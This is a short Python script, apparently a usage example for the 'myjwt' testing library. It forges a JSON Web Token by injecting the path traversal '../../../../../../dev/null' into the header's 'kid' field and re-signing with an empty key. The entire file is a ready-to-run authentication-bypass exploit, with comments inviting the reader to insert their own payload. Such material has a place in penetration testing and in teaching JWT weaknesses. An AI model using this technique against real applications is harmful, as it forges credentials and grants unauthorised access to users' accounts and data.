from myjwt.modify_jwt import signature
from myjwt.utils import jwt_to_json
from myjwt.vulnerabilities import inject_sql_kid

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VyIjpudWxsfQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"
# Header: {"typ": "JWT", "alg": "HS256", "kid": "key1"}
# Payload: {"user": null}
# Signature: "2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"
injection = "../../../../../../dev/null"
# your injection
sign = ""
# empty signature
jwt = inject_sql_kid(jwt, injection)
# inject your payload in kid key
jwt = signature(jwt_to_json(jwt), sign)
# after your jwt header changed re-sign your jwt
print(jwt)
